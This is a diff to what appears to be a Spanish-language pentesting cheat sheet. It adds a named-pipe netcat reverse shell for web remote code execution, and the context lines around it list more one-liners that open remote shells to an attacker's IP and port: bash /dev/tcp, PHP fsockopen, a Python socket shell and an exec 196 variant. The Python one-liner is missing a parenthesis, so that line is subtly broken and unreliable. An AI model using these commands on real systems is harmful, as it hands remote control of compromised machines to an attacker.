@@ -34,6 +34,13 @@ SNMP ->
 Reverse shell
     Recibida con nc -vvv -n -l -p PUERTO
     bash -i >& /dev/tcp/IP_DESTINO/NUM_PUERTO 0>&1
+    ---
+    Para RCE en web
+    mknod /tmp/backpipe p
+    /bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe
+    O probar también
+    /bin/sh -c "/bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe"
+    ---
     php -r '$sock=fsockopen("IP",Puerto);exec("/bin/sh -i <&3 >&3 2>&3");'
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",Port));os.dup2(s.fileno(),0;os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
     0<&196;exec 196<>/dev/tcp/IP/PUERTO; sh <&196 >&196 2>&196&		(el & final la pone en background)
